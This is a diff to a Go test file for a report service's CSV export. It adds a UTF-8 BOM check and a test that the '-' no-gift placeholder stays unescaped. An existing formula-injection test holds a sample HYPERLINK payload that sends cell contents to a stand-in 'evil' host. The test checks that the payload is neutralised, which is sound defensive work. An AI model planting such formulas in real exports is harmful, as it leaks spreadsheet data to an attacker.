@@ -49,6 +49,9 @@ func TestWriteCSV_NeutralisesFormulas(t *testing.T) {
 	if err != nil {
 		t.Fatalf("writeCSV: %v", err)
 	}
+	if !bytes.HasPrefix(data, []byte("\xEF\xBB\xBF")) {
+		t.Error("CSV must start with a UTF-8 BOM so Excel reads Chinese names")
+	}
 	r := csv.NewReader(bytes.NewReader(data))
 	r.FieldsPerRecord = -1
 	records, err := r.ReadAll()
@@ -65,5 +68,25 @@ func TestWriteCSV_NeutralisesFormulas(t *testing.T) {
 	}
 	if got, want := records[1][0], `'=HYPERLINK("http://evil/?d="&A2,"x")`; got != want {
 		t.Errorf("guest name cell = %q, want %q", got, want)
+	}
+}
+
+// The "-" shown for a guest with no gift is the report's own placeholder, not
+// user text: it must not come out as the escaped "'-".
+func TestWriteCSV_NoGiftPlaceholderIsPlain(t *testing.T) {
+	svc := &ReportService{}
+	rows, summary := svc.buildRows([]models.GuestRecord{{Name: "Ann", Pax: 1}}, nil)
+	data, err := svc.writeCSV(rows, summary)
+	if err != nil {
+		t.Fatalf("writeCSV: %v", err)
+	}
+	r := csv.NewReader(bytes.NewReader(data))
+	r.FieldsPerRecord = -1
+	records, err := r.ReadAll()
+	if err != nil {
+		t.Fatalf("parse CSV: %v", err)
+	}
+	if got := records[1][4]; got != "-" {
+		t.Fatalf("gift cell = %q, want -", got)
 	}
 }
